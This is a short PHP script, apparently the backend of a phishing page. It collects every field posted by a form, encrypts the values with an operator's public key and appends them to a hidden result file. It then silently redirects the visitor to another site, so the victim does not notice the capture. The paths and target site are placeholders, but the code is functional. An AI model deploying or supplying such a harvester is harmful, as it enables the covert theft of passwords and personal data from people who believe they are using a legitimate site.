<?php

$file = 'PATH_TO_RESULT_FILE';
$requestparams = $_POST;
$clearstring = implode( ", ", $requestparams);
$pubkey = openssl_pkey_get_public(file_get_contents('PATH_TO_PUBKEY_PEM'));
openssl_public_encrypt($clearstring, $crypted, $pubkey);
$encoded = base64_encode($crypted);
file_put_contents($file, print_r($encoded, true).PHP_EOL, FILE_APPEND);?>

<meta http-equiv="refresh" content="0; url=https://SITE" />
